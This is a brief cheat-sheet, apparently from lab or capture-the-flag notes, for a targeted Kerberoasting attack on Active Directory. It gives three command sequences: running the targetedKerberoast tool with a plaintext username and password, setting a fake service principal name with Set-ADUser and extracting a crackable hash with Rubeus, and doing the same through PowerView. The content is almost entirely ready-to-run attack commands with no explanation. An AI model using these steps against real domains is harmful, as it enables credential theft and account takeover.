
### Option A
#### Clone if you don't have it

```
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip3 install -r requirements.txt
```

#### Run it

```
python3 targetedKerberoast.py -d "delegate.vl" -u "a.briggs" -p "P4ssw0rd1#123" \
  --dc-ip 10.129.234.69
```


### Option B 

```
Set-ADUser svc_deploy -ServicePrincipalNames @{Add='http/fake.checkpoint.htb'}
```

```
Get-ADUser svc_deploy -Properties ServicePrincipalNames | Select -ExpandProperty ServicePrincipalNames
```

```
.\Rubeus.exe kerberoast /user:svc_deploy /nowrap /outfile:C:\temp\svc_hash.txt
```


### Option C

```
. .\PowerView.ps1
```

```
Set-DomainObject -Identity svc_deploy -SET @{serviceprincipalname='fake/checkpoint.htb'}
```

```
Get-DomainSPNTicket -SPN "fake/checkpoint.htb" -OutputFormat Hashcat
```

